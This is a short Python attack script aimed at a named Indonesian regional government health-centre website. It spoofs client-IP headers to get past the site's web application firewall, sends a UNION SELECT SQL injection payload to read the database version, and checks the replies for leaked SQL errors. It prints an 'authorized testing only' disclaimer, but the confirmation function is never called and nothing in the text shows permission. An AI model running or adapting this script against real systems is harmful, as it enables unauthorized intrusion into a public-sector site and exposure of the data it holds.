import requests
import sys
import time

TARGET = "https://puskesjaten1.karanganyarkab.go.id"
HEADERS_BYPASS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "X-Originating-IP": "127.0.0.1",
    "X-Remote-IP": "127.0.0.1",
    "X-Client-IP": "127.0.0.1",
    "X-Forwarded-For": "127.0.0.1"
}

def user_confirmation():
    print("WARNING: This script sends a live SQLi probe to verify WAF bypass.")
    print("This is for educational/authorized testing purposes only.")
    
def test_bypass():
    print(f"[+] Verifying WAF Bypass: {TARGET}")
    print(f"[+] Headers: X-Originating-IP: 127.0.0.1 (IP Spoofing)")
    print("="*60)

    # 1. Baseline (Normal Request + Bypass Headers)
    try:
        import urllib3
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        
        r = requests.get(TARGET, headers=HEADERS_BYPASS, timeout=15, verify=False)
        print(f"[*] Baseline Request: {r.status_code}")
        if r.status_code != 200:
            print("    [!] Failed to access site even with bypass headers!")
            return
    except Exception as e:
        print(f"    [!] Error: {e}")
        return

    # 2. Attack Vector (SQLi) WITHOUT Bypass
    print("\n[*] Testing Malicious Payload WITHOUT Headers...")
    payload = "/?id=-1 UNION SELECT 1,version(),3--"
    try:
        r_fail = requests.get(TARGET + payload, headers={"User-Agent": HEADERS_BYPASS["User-Agent"]}, timeout=15, verify=False)
        print(f"    Status: {r_fail.status_code} (Expected: 403 or Reset)")
    except Exception as e:
         print(f"    Status: CONNECTION RESET/DROP (Confirmed Block)")

    # 3. Attack Vector (SQLi) WITH Bypass
    print("\n[*] Testing Malicious Payload WITH BYPASS HEADERS...")
    try:
        r_pass = requests.get(TARGET + payload, headers=HEADERS_BYPASS, timeout=15, verify=False)
        print(f"    Status: {r_pass.status_code}")
        
        if r_pass.status_code == 200:
            print("    [+] BYPASS SUCCESSFUL! Payload was accepted.")
            if "SQL syntax" in r_pass.text or "mysql" in r_pass.text.lower():
                print("    [+] SQL ERROR LEAKED! (High Vulnerability)")
            else:
                print("    [+] Page loaded normally (Blind SQLi possible)")
        elif r_pass.status_code == 403:
            print("    [-] Failed. Still blocked by L1 (Nginx).")
        else:
             print(f"    [?] Unexpected status: {r_pass.status_code}")
             
    except Exception as e:
        print(f"    [-] Failed. Connection Reset (L2) still active. Error: {e}")

if __name__ == "__main__":
    test_bypass()
